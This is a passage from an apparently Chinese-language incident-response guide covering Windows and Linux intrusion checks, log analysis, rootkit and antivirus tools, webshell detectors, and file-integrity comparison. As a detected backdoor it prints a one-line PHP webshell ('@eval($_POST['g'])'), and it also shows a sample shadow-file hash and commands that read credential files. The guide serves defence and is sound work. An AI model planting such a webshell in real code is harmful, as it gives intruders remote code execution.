<img src="https://jinqipiaopiao.github.io//post-images/1627001934536.png" alt="" loading="lazy"><br>
2、检查计划任务</p>
</li>
<li>
<p>检查方法：</p>
<p>a、单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。</p>
<p>b、单击【开始】&gt;【运行】；输入 <code>cmd</code>，然后输入 <code>at</code>，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。</p>
</li>
</ul>
<p>3、服务自启动</p>
<ul>
<li>检查方法：单击【开始】&gt;【运行】，输入 <code>services.msc</code>，注意服务状态和启动类型，检查是否有异常服务。</li>
</ul>
<h4 id="14-检查系统相关信息">1.4 检查系统相关信息</h4>
<p>1、查看系统版本以及补丁信息</p>
<ul>
<li>检查方法：单击【开始】&gt;【运行】，输入 <code>systeminfo</code>，查看系统信息。</li>
</ul>
<p>2、查找可疑目录及文件</p>
<ul>
<li>
<p>检查方法：</p>
<p>a、 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。</p>
<pre><code>Window 2003版本 C:\Documents and Settings
Window 2008R2及以后版本 C:\Users\
</code></pre>
<p>b、单击【开始】&gt;【运行】，输入 <code>%UserProfile%\Recent</code>，分析最近打开分析可疑文件。</p>
<p>c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。</p>
<p>d、回收站、浏览器下载目录、浏览器历史记录</p>
<p>e、修改时间在创建时间之前的为可疑文件</p>
</li>
</ul>
<p>3、发现并得到 WebShell、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p>
<p>a、利用 <a href="http://www.torchsoft.com/en/rw_information.html">Registry Workshop</a> 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。<br>
b、利用计算机自带文件搜索功能，指定修改时间进行搜索。</p>
<h4 id="15-自动化查杀">1.5 自动化查杀</h4>
<ul>
<li>
<p>病毒查杀</p>
<ul>
<li>检查方法：下载安全软件，更新最新病毒库，进行全盘扫描。</li>
</ul>
</li>
<li>
<p>webshell查杀</p>
<ul>
<li>检查方法：选择具体站点路径进行webshell查杀，建议使用两款 WebShell 查杀工具同时查杀，可相互补充规则库的不足。</li>
</ul>
</li>
</ul>
<h4 id="16-日志分析">1.6 日志分析</h4>
<p>系统日志</p>
<ul>
<li>
<p>分析方法：</p>
<p>a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p>
<p>b、Win+R 打开运行，输入 &quot;eventvwr.msc&quot;，回车运行，打开&quot;事件查看器&quot;。</p>
<p>C、导出应用程序日志、安全日志、系统日志，利用 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析。</p>
</li>
</ul>
<p>Web 访问日志</p>
<ul>
<li>
<p>分析方法：</p>
<p>a、找到中间件的web日志，打包到本地方便进行分析。</p>
<p>b、推荐工具：Windows 下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。Linux 下，使用 Shell 命令组合查询分析。</p>
</li>
</ul>
<h3 id="0x02-工具篇">0x02 工具篇</h3>
<h4 id="21-病毒分析">2.1 病毒分析</h4>
<p>PCHunter：http://www.xuetr.com</p>
<p>火绒剑：https://www.huorong.cn</p>
<p>Process Explorer：https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</p>
<p>processhacker：https://processhacker.sourceforge.io/downloads.php</p>
<p>autoruns：https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</p>
<p>OTL：https://www.bleepingcomputer.com/download/otl/</p>
<p>SysInspector：http://download.eset.com.cn/download/detail/?product=sysinspector</p>
<h4 id="22-病毒查杀">2.2 病毒查杀</h4>
<p>卡巴斯基：http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe   （推荐理由：绿色版、最新病毒库）</p>
<p>大蜘蛛：http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）</p>
<p>火绒安全软件：https://www.huorong.cn</p>
<p>360杀毒：http://sd.360.cn/download_center.html</p>
<h4 id="23-病毒动态">2.3 病毒动态</h4>
<p>CVERC-国家计算机病毒应急处理中心：http://www.cverc.org.cn</p>
<p>微步在线威胁情报社区：https://x.threatbook.cn</p>
<p>火绒安全论坛：http://bbs.huorong.cn/forum-59-1.html</p>
<p>爱毒霸社区：http://bbs.duba.net</p>
<p>腾讯电脑管家：http://bbs.guanjia.qq.com/forum-2-1.html</p>
<h4 id="24-在线病毒扫描网站">2.4 在线病毒扫描网站</h4>
<p>Virustotal：https://www.virustotal.com</p>
<p>Virscan：http://www.virscan.org</p>
<p>腾讯哈勃分析系统：https://habo.qq.com</p>
<p>Jotti 恶意软件扫描系统：https://virusscan.jotti.org</p>
<h4 id="25-webshell查杀">2.5 webshell查杀</h4>
<p>D盾_Web查杀：http://www.d99net.net/index.asp</p>
<p>河马 WebShell 查杀：http://www.shellpub.com</p>
<p>#Linux 入侵排查<br>
当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。</p>
<p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Linux 服务器入侵排查的思路。</p>
<h3 id="0x01-入侵排查思路-2">0x01 入侵排查思路</h3>
<h4 id="11-账号安全">1.1 账号安全</h4>
<p><strong>基本使用：</strong></p>
<pre><code>1、用户信息文件 /etc/passwd
root:x:0:0:root:/root:/bin/bash
account:password:UID:GID:GECOS:directory:shell
用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后的 shell
注意：无密码只允许本机登陆，远程不允许登陆

2、影子文件 /etc/shadow
root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::
用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留
</code></pre>
<pre><code>who     查看当前登录用户（tty 本地登陆  pts 远程登录）
w       查看系统信息，想知道某一时刻用户的行为
uptime  查看登陆多久、多少用户，负载状态
</code></pre>
<p><strong>入侵排查：</strong></p>
<pre><code>1、查询特权用户特权用户(uid 为0)
[root@localhost ~]# awk -F: '$3==0{print $1}' /etc/passwd
2、查询可以远程登录的帐号信息
[root@localhost ~]# awk '/\$1|\$6/{print $1}' /etc/shadow
3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限
[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;
4、禁用或删除多余及可疑的帐号
    usermod -L user    禁用帐号，帐号无法登录，/etc/shadow 第二栏为 ! 开头
	userdel user       删除 user 用户
	userdel -r user    将删除 user 用户，并且将 /home 目录下的 user 目录一并删除
</code></pre>
<h4 id="12-历史命令">1.2 历史命令</h4>
<p><strong>基本使用：</strong></p>
<p>通过 .bash_history 文件查看帐号执行过的系统命令</p>
<pre><code>1、root 用户的历史命令
histroy
2、打开 /home 各帐号目录下的 .bash_history，查看普通帐号执行的历史命令。
为历史的命令增加登录的 IP 地址、执行命令时间等信息：
1）保存1万条命令
sed -i 's/^HISTSIZE=1000/HISTSIZE=10000/g' /etc/profile
2）在/etc/profile的文件尾部添加如下行数配置信息：
######jiagu history xianshi#########
USER_IP=`who -u am i 2&gt;/dev/null | awk '{print $NF}' | sed -e 's/[()]//g'`
if [ &quot;$USER_IP&quot; = &quot;&quot; ]
then
USER_IP=`hostname`
fi
export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;
shopt -s histappend
export PROMPT_COMMAND=&quot;history -a&quot;
######### jiagu history xianshi ##########
3）source /etc/profile 让配置生效
生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile
3、历史操作命令的清除：history -c
但此命令并不会清除保存在文件中的记录，因此需要手动删除 .bash_profile 文件中的记录。
</code></pre>
<p><strong>入侵排查：</strong></p>
<pre><code>进入用户目录下，导出历史命令。
cat .bash_history &gt;&gt; history.txt
</code></pre>
<h4 id="13-检查异常端口">1.3 检查异常端口</h4>
<p>使用 netstat 网络连接命令，分析可疑端口、IP、PID</p>
<pre><code>netstat -antlp | more

查看下 pid 所对应的进程文件路径，
运行 ls -l /proc/$PID/exe 或 file /proc/$PID/exe（$PID 为对应的 pid 号）
</code></pre>
<h4 id="14-检查异常进程">1.4 检查异常进程</h4>
<p>使用 ps 命令，分析进程</p>
<pre><code>ps aux | grep pid 
</code></pre>
<h4 id="15-检查开机启动项">1.5 检查开机启动项</h4>
<p><strong>基本使用：</strong></p>
<p>系统运行级别示意图：</p>
<table>
<thead>
<tr>
<th style="text-align:center">运行级别</th>
<th style="text-align:center">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">关机</td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">单用户模式，可以想象为windows的安全模式，主要用于系统修复</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">不完全的命令行模式，不含NFS服务</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">完全的命令行模式，就是标准字符界面</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">系统保留</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td style="text-align:center">图形模式</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">重启动</td>
</tr>
</tbody>
</table>
<p>查看运行级别命令 <code>runlevel</code></p>
<p>系统默认允许级别</p>
<pre><code>vi  /etc/inittab
id=3：initdefault  #系统开机后直接进入哪个运行级别
</code></pre>
<p>开机启动配置文件</p>
<pre><code>/etc/rc.local
/etc/rc.d/rc[0~6].d
</code></pre>
<p>例子：当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在 /etc/init.d 目录下，然后在 /etc/rc.d/rc*.d 文件中建立软链接即可。</p>
<p>注：此中的 * 代表 0,1,2,3,4,5,6 这七个等级</p>
<pre><code>root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh
</code></pre>
<p>此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的。</p>
<p><strong>入侵排查：</strong></p>
<p>启动项文件：</p>
<pre><code>more /etc/rc.local
/etc/rc.d/rc[0~6].d
ls -l /etc/rc.d/rc3.d/
</code></pre>
<h4 id="16-检查定时任务">1.6 检查定时任务</h4>
<p><strong>基本使用</strong></p>
<p>1、利用 crontab 创建计划任务</p>
<ul>
<li>
<p>基本命令</p>
<pre><code>crontab -l   列出某个用户cron服务的详细内容

Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root

crontab -r   删除每个用户cront任务(谨慎：删除所有的计划任务)

crontab -e   使用编辑器编辑当前的crontab文件 

如：*/1 * * * * echo &quot;hello world&quot; &gt;&gt; /tmp/test.txt 每分钟写入文件
</code></pre>
</li>
</ul>
<p>2、利用 anacron 命令实现异步定时任务调度</p>
<ul>
<li>
<p>使用案例</p>
<pre><code>每天运行 /home/backup.sh 脚本：
vi /etc/anacrontab 
@daily    10    example.daily   /bin/bash /home/backup.sh
当机器在 backup.sh 期望被运行时是关机的，anacron会在机器开机十分钟之后运行它，而不用再等待 7天。
</code></pre>
</li>
</ul>
<p><strong>入侵排查</strong></p>
<p>重点关注以下目录中是否存在恶意脚本</p>
<pre><code>/var/spool/cron/* 
/etc/crontab
/etc/cron.d/*
/etc/cron.daily/* 
/etc/cron.hourly/* 
/etc/cron.monthly/*
/etc/cron.weekly/
/etc/anacrontab
/var/spool/anacron/*
</code></pre>
<p>小技巧：</p>
<pre><code>more /etc/cron.daily/*  查看目录下所有文件
</code></pre>
<h4 id="17-检查服务">1.7 检查服务</h4>
<p><strong>服务自启动</strong></p>
<p>第一种修改方法：</p>
<pre><code>chkconfig [--level 运行级别] [独立服务名] [on|off]
chkconfig –level  2345 httpd on  开启自启动
chkconfig httpd on （默认level是2345）
</code></pre>
<p>第二种修改方法：</p>
<pre><code>修改 /etc/re.d/rc.local 文件  
加入 /etc/init.d/httpd start
</code></pre>
<p>第三种修改方法：</p>
<p>使用 ntsysv 命令管理自启动，可以管理独立服务和 xinetd 服务。</p>
<p><strong>入侵排查</strong></p>
<p>1、查询已安装的服务：</p>
<p>RPM 包安装的服务</p>
<pre><code>chkconfig  --list  查看服务自启动状态，可以看到所有的RPM包安装的服务
ps aux | grep crond 查看当前服务

系统在3与5级别下的启动项 
中文环境
chkconfig --list | grep &quot;3:启用\|5:启用&quot;
英文环境
chkconfig --list | grep &quot;3:on\|5:on&quot;
</code></pre>
<p>源码包安装的服务</p>
<pre><code>查看服务安装位置 ，一般是在/user/local/
service httpd start
搜索/etc/rc.d/init.d/  查看是否存在
</code></pre>
<h4 id="18-检查异常文件">1.8 检查异常文件</h4>
<p>1、查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性</p>
<p>2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p>
<p>​	可以使用find命令来查找，如  find /opt -iname &quot;*&quot; -atime 1 -type f 找出 /opt 下一天前访问过的文件</p>
<p>3、针对可疑文件可以使用 stat 进行创建修改时间。</p>
<h4 id="19-检查系统日志">1.9 检查系统日志</h4>
<p>日志默认存放位置：/var/log/</p>
<p>查看日志配置情况：more /etc/rsyslog.conf</p>
<table>
<thead>
<tr>
<th style="text-align:center">日志文件</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">/var/log/cron</td>
<td style="text-align:center">记录了系统定时任务相关的日志</td>
</tr>
<tr>
<td style="text-align:center">/var/log/cups</td>
<td style="text-align:center">记录打印信息的日志</td>
</tr>
<tr>
<td style="text-align:center">/var/log/dmesg</td>
<td style="text-align:center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td>
</tr>
<tr>
<td style="text-align:center">/var/log/mailog</td>
<td style="text-align:center">记录邮件信息</td>
</tr>
<tr>
<td style="text-align:center">/var/log/message</td>
<td style="text-align:center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td>
</tr>
<tr>
<td style="text-align:center">/var/log/btmp</td>
<td style="text-align:center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td>
</tr>
<tr>
<td style="text-align:center">/var/log/lastlog</td>
<td style="text-align:center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td>
</tr>
<tr>
<td style="text-align:center">/var/log/wtmp</td>
<td style="text-align:center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td>
</tr>
<tr>
<td style="text-align:center">/var/log/utmp</td>
<td style="text-align:center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td>
</tr>
<tr>
<td style="text-align:center">/var/log/secure</td>
<td style="text-align:center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td>
</tr>
</tbody>
</table>
<p>日志分析技巧：</p>
<pre><code>1、定位有多少IP在爆破主机的root帐号：    
grep &quot;Failed password for root&quot; /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more

定位有哪些IP在爆破：
grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c

爆破用户名字典是什么？
grep &quot;Failed password&quot; /var/log/secure|perl -e 'while($_=&lt;&gt;){ /for(.*?) from/; print &quot;$1\n&quot;;}'|uniq -c|sort -nr
 
2、登录成功的IP有哪些： 	
grep &quot;Accepted &quot; /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more

登录成功的日期、用户名、IP：
grep &quot;Accepted &quot; /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 

3、增加一个用户kali日志：
Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001
Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali
, shell=/bin/bash
Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali
#grep &quot;useradd&quot; /var/log/secure 

4、删除用户kali日志：
Jul 10 00:14:17 localhost userdel[2393]: delete user 'kali'
Jul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali'
Jul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali'
# grep &quot;userdel&quot; /var/log/secure

5、su切换用户：
Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)

sudo授权执行:
sudo -l
Jul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now
</code></pre>
<h3 id="0x02-工具篇-2">0x02 工具篇</h3>
<h4 id="21-rootkit查杀">2.1 Rootkit查杀</h4>
<ul>
<li>
<p>chkrootkit</p>
<p>网址：http://www.chkrootkit.org</p>
<pre><code>使用方法：
wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz
tar zxvf chkrootkit.tar.gz
cd chkrootkit-0.52
make sense
#编译完成没有报错的话执行检查
./chkrootkit
</code></pre>
</li>
<li>
<p>rkhunter</p>
<p>网址：http://rkhunter.sourceforge.net</p>
<pre><code>使用方法：
Wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz
tar -zxvf rkhunter-1.4.4.tar.gz
cd rkhunter-1.4.4
./installer.sh --install
rkhunter -c
</code></pre>
</li>
</ul>
<h4 id="22-病毒查杀-2">2.2 病毒查杀</h4>
<ul>
<li>
<p>Clamav</p>
<p>网址：<a href="http://www.clamav.net/download.html">http://www.clamav.net/download.html</a></p>
<p>安装方式一：</p>
<pre><code>1、安装 zlib：
wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz 
tar -zxvf  zlib-1.2.7.tar.gz
cd zlib-1.2.7
#安装一下gcc编译环境： yum install gcc
CFLAGS=&quot;-O3 -fPIC&quot; ./configure --prefix= /usr/local/zlib/
make &amp;&amp; make install

2、添加用户组 clamav 和组成员 clamav：
groupadd clamav
useradd -g clamav -s /bin/false -c &quot;Clam AntiVirus&quot; clamav

3、安装 Clamav
tar –zxvf clamav-0.97.6.tar.gz
cd clamav-0.97.6
./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/local/zlib
make
make install

4、配置 Clamav
mkdir /opt/clamav/logs
mkdir /opt/clamav/updata
touch /opt/clamav/logs/freshclam.log
touch /opt/clamav/logs/clamd.log
cd /opt/clamav/logs
chown clamav:clamav clamd.log
chown clamav:clamav freshclam.log

5、ClamAV 使用：
 /opt/clamav/bin/freshclam 升级病毒库
./clamscan –h 查看相应的帮助信息
./clamscan -r /home  扫描所有用户的主目录就使用
./clamscan -r --bell -i /bin  扫描bin目录并且显示有问题的文件的扫描结果
</code></pre>
<p>安装方式二：</p>
<pre><code>#安装
yum install -y clamav
#更新病毒库
freshclam
#扫描方法
clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log
clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log
clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log
#扫描并杀毒
clamscan -r  --remove  /usr/bin/bsd-port
clamscan -r  --remove  /usr/bin/
clamscan -r --remove  /usr/local/zabbix/sbin
#查看日志发现
cat /root/usrclamav.log |grep FOUND
</code></pre>
</li>
</ul>
<h4 id="23-webshell查杀">2.3 webshell查杀</h4>
<p>Linux 版：</p>
<pre><code>河马 WebShell 查杀：http://www.shellpub.com
</code></pre>
<h4 id="24-rpm-check-检查">2.4 RPM check 检查</h4>
<p>系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包，查看哪些命令是否被替换了：</p>
<pre><code>./rpm -Va &gt; rpm.log
</code></pre>
<p>如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。</p>
<pre><code>验证内容中的8个信息的具体内容如下：
		S         文件大小是否改变
		M         文件的类型或文件的权限（rwx）是否被改变
		5         文件MD5校验是否改变（可以看成文件内容是否改变）
		D         设备中，从代码是否改变
		L         文件路径是否改变
		U         文件的属主（所有者）是否改变
		G         文件的属组是否改变
		T         文件的修改时间是否改变
</code></pre>
<p>如果命令被替换了，如果还原回来：</p>
<pre><code>文件提取还原案例：
rpm  -qf /bin/ls  查询 ls 命令属于哪个软件包
mv  /bin/ls /tmp  先把 ls 转移到 tmp 目录下，造成 ls 命令丢失的假象
rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取 rpm 包中 ls 命令到当前目录的 /bin/ls 下
cp /root/bin/ls  /bin/ 把 ls 命令复制到 /bin/ 目录 修复文件丢失
</code></pre>
<h4 id="25-linux安全检查脚本">2.5 Linux安全检查脚本</h4>
<p>Github 项目地址：</p>
<p>https://github.com/grayddq/GScan</p>
<p>https://github.com/ppabc/security_check</p>
<p>https://github.com/T0xst/linux</p>
<p><strong>尽信书不如无书，工具只是辅助，别太过于依赖，关键在于你如何解决问题的思路。</strong></p>
<p>#常见的 Webshell 查杀工具</p>
<h3 id="前言">前言</h3>
<p>当网站服务器被入侵时，我们需要一款Webshell检测工具，来帮助我们发现webshell，进一步排查系统可能存在的安全漏洞。</p>
<p>本文推荐了10款 WebShll 检测工具，用于网站入侵排查。当然，目前市场上的很多主机安全产品也都提供这种 WebShell 检测能力，比如阿里云、青藤云、safedog 等，本文暂不讨论。</p>
<hr>
<p><strong>1、D盾_Web查杀</strong></p>
<p>阿D出品，使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的 WebShell 后门行为。</p>
<p>兼容性：只提供 Windows 版本。</p>
<p>工具下载地址：http://www.d99net.net<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002152173.png" alt="" loading="lazy"><br>
<strong>2、百度 WEBDIR+</strong></p>
<p>下一代 WebShell 检测引擎，采用先进的动态监测技术，结合多种引擎零规则查杀。</p>
<p>兼容性：提供在线查杀木马，免费开放 API 支持批量检测。</p>
<p>在线查杀地址：https://scanner.baidu.com<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002169145.png" alt="" loading="lazy"><br>
<strong>3、河马</strong></p>
<p>专注 WebShell 查杀研究，拥有海量 WebShell 样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术。查杀速度快、精度高、误报低。</p>
<p>兼容性：支持 Windows、Linux，支持在线查杀。</p>
<p>官方网站：https://www.shellpub.com<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002183565.png" alt="" loading="lazy"><br>
<strong>4、Web Shell Detector</strong></p>
<p>Web Shell Detector 具有 WebShell 签名数据库，可帮助识别高达 99％ 的 WebShell。</p>
<p>兼容性：提供 PHP、Python 脚本，可跨平台，在线检测。</p>
<p>官方网站：http://www.shelldetector.com</p>
<p>github项目地址：https://github.com/emposha/PHP-Shell-Detector<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002202971.png" alt="" loading="lazy"><br>
<strong>5、CloudWalker（牧云）</strong></p>
<p>一个可执行的命令行版本 Webshell 检测工具。目前，项目已停止更新。</p>
<p>兼容性：提供 Linux版本，Windows 暂不支持。</p>
<p>在线查杀 https://webshellchop.chaitin.cn</p>
<p>GitHub 项目地址：https://github.com/chaitin/cloudwalker<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002230652.png" alt="" loading="lazy"><br>
<strong>6、Sangfor WebShellKill</strong></p>
<p>Sangfor WebShellKill (网站后门检测工具)是一款 Web 后门专杀工具，不仅支持 WebShell 的扫描，同时还支持暗链的扫描。是一款融合了多重检测引擎的查杀工具。能更精准地检测出WEB网站已知和未知的后门文件。</p>
<p>兼容性：支持 Windows、linux</p>
<p>工具下载地址：http://edr.sangfor.com.cn/backdoor_detection.html（已停止访问）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002254319.png" alt="" loading="lazy"><br>
<strong>7、深度学习模型检测 PHP Webshell</strong></p>
<p>一个深度学习 PHP WebShell 查杀引擎 demo，提供在线样本检测。</p>
<p>在线查杀地址：http://webshell.cdxy.me<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002279026.png" alt="" loading="lazy"><br>
<strong>8、PHP Malware Finder</strong></p>
<p>PHP-malware-finder 是一款优秀的检测webshell和恶意软件混淆代码的工具</p>
<p>兼容性：提供Linux 版本，Windows 暂不支持。</p>
<p>GitHub 项目地址：https://github.com/jvoisin/php-malware-finder<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002296973.png" alt="" loading="lazy"><br>
<strong>9、findWebshell</strong></p>
<p>这个项目是一款基于 Python 开发的 WebShell 检查工具，可以根据特征码匹配检查任意类型的 WebShell 后门。</p>
<p>GitHub 项目地址：https://github.com/he1m4n6a/findWebshell<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002335566.png" alt="" loading="lazy"><br>
<strong>10、在线 WebShell 查杀工具</strong></p>
<p>在线查杀地址：http://tools.bugscaner.com/killwebshell<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002355640.png" alt="" loading="lazy"></p>
<p>#如何发现隐藏的 Webshell 后门</p>
<h3 id="前言-2">前言：</h3>
<p>如何在百万行代码里发现隐藏的后门？</p>
<p>试想一下，如果你的网站被入侵，攻击者留下隐藏的后门，你真的都可以找出来吗？面对一个大中型的应用系统，数以百万级的代码行，是不可能做到每个文件每段代码进行手工检查的。</p>
<p>即使是一款拥有 99.9% 的 Webshell 检出率的检测引擎，依然可能存在 Webshell 绕过的情况。另外，像暗链、网页劫持、页面跳转等常见的黑帽 SEO 手法，也很难通过手动检测或工具检测全部识别出来。</p>
<p>最好的方式就是做文件完整性验证。通过与原始代码对比，可以快速发现文件是否被篡改以及被篡改的位置。当然，第一个前提是，你所在的团队已具备代码版本管理的能力，如果你是个人站长，相信你已经备份了原始代码。</p>
<p>本文将结合实际应用，介绍几种文件完整性验证方式，可以帮助你找出代码中所有隐藏的后门。</p>
<hr>
<p><strong>1、文件 MD5 校验</strong></p>
<p>下载D盾_Web查杀工具的时候，我们可以留意到下载的压缩包里，除了有一个 exe 可执行文件，还有一个文件 md5 值。这个是软件作者在发布软件时，通过 md5 算法计算出该 exe 文件的&quot;特征值&quot;。</p>
<pre><code>下载地址：http://www.d99net.net/down/WebShellKill_V2.0.9.zip
文件 MD5：29285decadbce3918a4f8429ec33df46   WebShellKill.exe
</code></pre>
<p>当用户下载软件时，可以使用相同的校验算法计算下载到 exe 文件的特征值，并与软件开发者发布的特征值比较。如果两个特征值相同，则认为下载到的 exe 文件是正确的。如果两个特征值不同，则认为下载到 exe 文件是被篡改过的。</p>
<p>那同理可得，我们可以将所有网站文件计算一次 hash 值保存，当出现应急情况时，重新计算一次 hash 值，并与上次保存的 hash 值进行对比，从而输出新创建的、修改过及删除的文件列表。</p>
<p>文件 hash 值计算：</p>
<pre><code>def md5sum(file):
    m=hashlib.md5()
    if os.path.isfile(file):
        f=open(file,'rb')
        for line in f:
            m.update(line)
        f.close
    else:
        m.update(file)
    return (m.hexdigest())
</code></pre>
<p>对文件进行哈希值重新计算，进行校验对比，测试效果：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002527884.png" alt="" loading="lazy"><br>
如上图，在上传目录新增了一个 evil.php 文件，还有一个被篡改的文件是 low.php 。使用常见的编辑器 Notepad++ 进行对比，可以发现 low.php 文件里被插入了一句话 WebShell。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002548996.png" alt="" loading="lazy"><br>
<strong>2、diff 命令</strong></p>
<p>在 Linux 中，我们经常使用 diff 命令来比较两个文本文件的差异。同样，我们可以通过一行命令快速找出两个项目文件的差异。</p>
<pre><code>diff -c -a -r cms1 cms2
</code></pre>
<p>如下图所示，前三行列出了两个要对比的文件目录的差异，可以发现 low.php 文件被篡改过，篡改的内容是 <code>@eval($_POST['g']);</code><br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002578294.png" alt="" loading="lazy"><br>
备注：如果只是想查看两个文件是否不同又不想显示差异之处的话，可以加上 -q 选项。</p>
<p><strong>3、版本控制工具</strong></p>
<p>版本控制工具，比如说 git，重新上传代码到 git，add+commit+push，然后打开项目，点击 commits，在历史提交版本里面，查看文件更改内容，很容易就可以发现代码被篡改的地方了。</p>
<p>另外，也可以通过 git diff 用来比较文件之间的不同。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002594567.png" alt="" loading="lazy"><br>
<strong>4、文件对比工具</strong></p>
<p>关键词：代码对比工具，你会找到很多好用的工具，这里我们推荐两款效果还不错的工具，Beyond Compare 和 WinMerge。</p>
<p><strong>Beyond Compare</strong></p>
